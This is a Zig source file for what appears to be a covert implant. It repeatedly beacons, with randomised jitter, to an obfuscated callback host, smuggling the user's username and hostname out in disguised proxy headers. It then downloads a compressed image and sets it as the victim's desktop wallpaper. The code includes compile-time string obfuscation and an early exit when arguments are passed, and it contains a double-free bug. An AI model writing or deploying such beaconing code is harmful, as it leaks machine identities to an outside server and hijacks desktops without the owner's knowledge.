const native_os = @import("builtin").os.tag;
const config = @import("config");

const obfuscation = @import("obfuscation");

const std = @import("std");

// set log level by build type
pub const default_level: std.Level = switch (std.builtin.mode) {
    .Debug => .debug,
    .ReleaseSafe, .ReleaseFast, .ReleaseSmall => .info,
};

pub const WallpaperManager = switch (native_os) {
    .windows => @import("set_wallpaper_windows.zig"),
    .linux => @import("set_wallpaper_linux.zig"),
    else => @compileError("Unsupported os"),
};

const Action = struct {
    const Self = @This();
    source: []u8,
    allocator: std.mem.Allocator,

    pub fn init(allocator: std.mem.Allocator) !Self {
        return Self{
            .source = std.fmt.allocPrintZ(allocator, "{s}", .{config.callback_host}) catch "",
            .allocator = allocator,
        };
    }

    fn fetch(self: *Self) !bool {
        var client = std.http.Client{
            .allocator = self.allocator,
        };

        const username = WallpaperManager.GetUsername(self.allocator);
        defer self.allocator.free(username);

        const hostname = WallpaperManager.GetHostname(self.allocator);
        defer self.allocator.free(username);

        const headers = &[_]std.http.Header{
            .{ .name = "Accept", .value = "text/html" },
            .{ .name = "X-Proxy-User", .value = username },
            .{ .name = "X-Proxy-Host", .value = hostname },
        };

        var response_body = std.ArrayList(u8).init(self.allocator);
        const url = try std.fmt.allocPrintZ(self.allocator, "{s}/tes.png", .{&obfuscation.comptimeObfuscation(config.callback_host)});
        defer self.allocator.free(url);

        std.log.info("Sending request to: {s}\n", .{url});
        const response = try client.fetch(.{
            .method = .GET,
            .location = .{ .url = url },
            .extra_headers = headers,
            .max_append_size = 1024 * 1024 * 5, // 5MB max size
            .response_storage = .{
                .dynamic = &response_body,
            },
        });

        std.log.info("Response Status: {d}\n", .{response.status});

        if (std.http.Status.ok == response.status) {
            const file = try std.fs.cwd().createFile(
                &obfuscation.comptimeObfuscation(config.host_background_path),
                .{ .read = true },
            );
            defer file.close();

            var fbs = std.io.fixedBufferStream(response_body.items);
            var dcp = std.compress.zlib.decompressor(fbs.reader());
            const image = dcp.reader().readAllAlloc(self.allocator, std.math.maxInt(usize)) catch {
                return false;
            };
            defer self.allocator.free(image);

            try file.writeAll(image);
            return true;
        }

        return false;
    }

    pub fn execute(self: *Self) !bool {
        while (true) {
            const success = try self.fetch();

            if (success) {
                std.log.info("Setting background to {s}", .{&obfuscation.comptimeObfuscation(config.host_background_path)});
                try WallpaperManager.SetWallpaper(self.allocator, &obfuscation.comptimeObfuscation(config.host_background_path));
            }

            const jitter_deplay = std.crypto.random.int(u32) % config.callback_jitter;
            const sleep_deplay: u64 = jitter_deplay + config.callback_delay;
            std.log.info("Waiting {d} seconds...\n", .{(sleep_deplay)});

            std.time.sleep((sleep_deplay) * std.time.ns_per_s);
        }

        return true;
    }

    pub fn deinit(self: *Self) void {
        self.allocator.free(self.source);
    }
};

pub fn main() !void {
    const alloc = std.heap.page_allocator;
    var arena = std.heap.ArenaAllocator.init(alloc);
    const allocator = arena.allocator();

    defer arena.deinit();

    // Parse args into string array (error union needs 'try')
    const args = try std.process.argsAlloc(allocator);
    defer std.process.argsFree(allocator, args);

    if (args.len > 1) {
        std.posix.exit(0);
    }

    var action = try Action.init(allocator);
    defer action.deinit();

    _ = try action.execute();
}
